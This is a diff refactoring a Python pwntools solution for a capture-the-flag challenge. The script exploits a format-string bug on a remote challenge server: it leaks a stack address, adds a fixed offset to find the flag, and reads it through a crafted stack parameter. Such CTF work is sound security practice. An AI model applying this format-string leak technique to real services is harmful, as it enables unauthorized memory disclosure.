@@ -1,11 +1,6 @@
-from subprocess import Popen, PIPE
-import sys
-import random
-import pwn
-import time
 import re
+import pwn
 
-pwn.context.log_level = 'error'
 
 def get_flag_address(conn):
     conn.recvline()
@@ -21,11 +16,11 @@ def get_flag_address(conn):
 
     # the flag is 0x2d15 far from the address we got with printing %9$p
     return int(return_address, 16) + 0x2d15
-   
+
 
 def get_string(conn, string_address):
 
-    qqq = re.findall('..',hex(string_address))[1:]
+    qqq = re.findall('..', hex(string_address))[1:]
     qqq = qqq[::-1]
 
     # the 13th parameter (8bytes) on the stack will be exactly the address we provide
@@ -40,10 +35,17 @@ def get_string(conn, string_address):
     return e.decode('ascii')
 
 
-conn = pwn.remote('challenges.crysys.hu', 5006)
+def solve():
+    conn = pwn.remote('challenges.crysys.hu', 5006)
 
-flag_address = get_flag_address(conn)
-flag = get_string(conn, flag_address)
-print(flag)
+    flag_address = get_flag_address(conn)
+    flag = get_string(conn, flag_address)
 
-conn.close()
+    conn.close()
+
+    return flag
+
+
+if __name__ == "__main__":
+    print(solve())
+
